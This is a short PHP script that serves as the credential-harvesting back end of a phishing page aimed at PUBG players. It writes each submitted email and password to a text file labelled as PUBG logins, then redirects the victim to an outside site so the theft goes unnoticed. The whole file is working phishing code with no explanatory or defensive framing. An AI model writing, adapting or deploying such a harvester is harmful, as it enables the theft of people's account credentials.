<?php

file_put_contents("usernames.txt", "PUBG Username: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://darkmovies.studio');
exit();
?>